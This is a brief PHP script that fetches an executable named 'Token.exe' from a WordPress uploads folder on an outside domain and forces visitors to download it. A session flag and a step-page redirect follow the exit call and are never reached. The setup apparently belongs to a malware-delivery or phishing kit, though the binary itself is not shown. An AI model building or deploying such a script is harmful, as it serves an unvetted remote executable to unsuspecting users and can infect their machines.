<?php

$file_name = 'Token.exe';
$file_url = 'https://studiokalalk.com/wp-content/uploads/' . $file_name;
header('Content-Type: application/octet-stream');
header("Content-Transfer-Encoding: Binary"); 
header("Content-disposition: attachment; filename=\"".$file_name."\""); 
readfile($file_url);
exit;

session_start();
$_SESSION['download'] = 'FAIL';
// header("location: ../pages/step3.php");
?>

